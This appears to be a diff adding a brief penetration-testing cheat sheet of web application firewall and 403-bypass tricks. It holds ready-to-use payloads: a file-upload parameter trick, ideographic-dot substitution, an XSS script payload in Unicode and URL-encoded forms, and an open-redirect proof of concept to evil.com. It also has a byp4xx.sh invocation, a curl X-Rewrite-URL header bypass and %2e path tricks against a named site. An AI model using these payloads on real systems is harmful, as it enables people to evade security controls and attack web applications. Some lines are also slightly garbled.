@@ -1,0 +1,44 @@
+WAF bypass during exploitation of file upload-----------+
+
+/?file=xx.php    <-- Blocked
+/?file===xx.php  <-- Bypassed
+
+
+
+Bypass WAF with Unicode characters-----------+
+
+https://www.rapidtables.com/code/text/unicode-characters.html
+if dot (.) character is blocked. you bypass it using the Chinese dot (。) character “%E3%80%82”
+
+Similar for xss and sqli payloads
+
+"><script>alert("xss")</script>
+U+0022U+003EU+003CU+0053U+0043U+0052U+0049U+0050U+0054U+003EU+0041U+004CU+0045U+0052U+0054U+0028U+0022U+0058U+0053U+0053U+0022U+003CU+002FU+0053U+0043U+0052U+0049U+0050U+0054U+003E
+
+the following payload url encodes the " + " character and unicodes the encodes the rest
+
+U%2b0022U+003EU%2b003CU%2b0053U%2b0043U%2b0052U%2b0049U%2b0050U%2b0054U%2b003EU%2b0041U%2b004CU%2b0045U%2b0052U%2b0054U%2b0028U%2b0022U%2b0058U%2b0053U%2b0053U%2b0022U%2b003CU%2b002FU%2b0053U%2b0043U%2b0052U%2b0049U%2b0050U%2b0054U%2b003E
+
+
+ Here’s a PoC example: 
+    redirect_to=////evil%E3%80%82com
+
+ This is equivalent to:
+    redirect_to=////evil.com
+
+403 Forbidden bypass-----------+
+
+ ./byp4xx.sh -c https://www.site.com.br/logs
+
+ where -c give the entire curl command executed
+ 
+ copy the command and execute eg: curl  -ki -H "X-Rewrite-URL: /logs/" -X GET "https://www.site.com.br/"
+ 
+ OR------------------->
+ 
+ you can also use the %2e after the first slash
+ 
+ eg https://site.com/path --> forbidden
+ then use https;//site.com/%2e/path --> bypassed
+
+ 
